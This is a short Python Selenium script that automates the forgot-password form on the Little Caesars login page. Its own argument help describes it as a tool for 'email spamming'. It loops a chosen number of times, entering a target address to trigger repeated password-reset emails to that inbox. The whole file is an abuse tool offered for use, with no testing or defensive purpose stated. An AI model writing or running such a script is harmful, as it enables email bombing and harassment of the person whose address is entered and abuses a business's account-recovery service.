from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time
import argparse

def test(driver):
    try:
        div = driver.find_element(By.CSS_SELECTOR, '.css-1fpjypo')
        button = div.find_element(By.TAG_NAME, 'button')
        button.click()
        return True
    except NoSuchElementException:
        return False

def click_forgot_password_link(driver):
    try:
        forgot_password_link = driver.find_element(By.CSS_SELECTOR, 'a[data-testid="login-form__forgot-password-link"]')
        forgot_password_link.click()
        print("Clicked on Forgot Password link.")
    except NoSuchElementException:
        print("Forgot Password link not found.")

def enter_email(driver, email):
    try:
        email_input = driver.find_element(By.CSS_SELECTOR, 'input[data-testid="forgotPassword__email"]')
        email_input.clear()
        email_input.send_keys(email)
        print(f"Entered email: {email}")
    except NoSuchElementException:
        print("Email input field not found.")

# Setup Chrome options
options = webdriver.ChromeOptions()

# Specify the path to your ChromeDriver executable
driver = webdriver.Chrome(options=options)

# Navigate to the page
driver.get('https://littlecaesars.com/en-us/login/')

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Automate email spamming.')
parser.add_argument('email', type=str, help='The email to spam.')
parser.add_argument('times', type=int, help='The number of times to spam the email.')
args = parser.parse_args()

# Automate the clicks
for _ in range(args.times):
    if test(driver):
        enter_email(driver, args.email)
        # make the sleep time the latency of the server
        time.sleep(2)
    else:
        click_forgot_password_link(driver)
        time.sleep(1)

driver.quit()
